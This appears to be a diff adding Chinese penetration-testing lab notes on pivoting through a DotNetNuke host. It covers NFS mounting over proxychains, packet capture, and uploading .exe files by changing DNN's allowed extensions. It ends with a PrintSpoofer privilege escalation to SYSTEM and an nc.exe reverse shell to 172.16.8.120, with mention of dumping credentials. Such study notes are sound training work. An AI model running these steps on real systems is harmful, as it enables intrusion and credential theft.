@@ -267,5 +267,23 @@ auxiliary/scanner/http/tomcat_mgr_login      攻击 Tomecat
  DotNetNuke (DNN)
 一个用 .NET 编写的内容管理系统 (CMS)，基本上是 .NET 领域的 WordPress
 
+proxychains showmount -e 172.16.8.20      展示 NFS
+mkdir DEV01
+mount -t nfs 172.16.8.20:/DEV01 /tmp/DEV01      在跳板机，挂载到 /tmp/DEV01
 
+tcpdump -i ens192 -s 65535 -w ilfreight_pcap      抓网卡 ens192 的包，存到 ilfreight_pcap
+用 WireShark 打卡
+
+关于 DNN，另一个有趣的地方是允许添加文件扩展名 来允许上传 .asp 和 .aspx 文件
+接下来需要提升权限
+查到 SeImpersonate 权限
+通过 SeImpersonate and SeAssignPrimaryToken，将权限提升到 SYSTEM，这将在活动目录 (Active Directory, AD) 域中获得一个初步的立足点，并允许开始枚举 AD
+尝试使用 PrintSpoofer 工具提升权限，然后看看是否能从主机的内存或注册表 (registry) 中转储 (dump) 任何有用的凭据
+在 DEV01 主机上需要 nc.exe 来向我们自己发送一个 shell，以及 PrintSpoofer64.exe 二进制文件来利用 SeImpersonate 权限
+有几种方法可以将它们传输上去
+可以使用 dmz01 主机作为“跳板机 (jump host)”，通过 SCP 将工具传输过去，然后启动一个 Python3 Web 服务器，并使用 certutil 将它们下载到 DEV01 主机上
+一个更简单的方法是再次修改 DNN 的 Allowable File Extensions，允许 .exe 文件格式
+然后上传这两个文件，并通过 shell 确认它们位于 c:\DotNetNuke\Portals\0
+上传后，可以在 dmz01 主机上启动一个 Netcat 监听器 ，并运行以下命令以获取一个 NT AUTHORITY\SYSTEM 权限的反向 shell：
+c:\DotNetNuke\Portals\0\PrintSpoofer64.exe -c "c:\DotNetNuke\Portals\0\nc.exe 172.16.8.120 443 -e cmd"
 
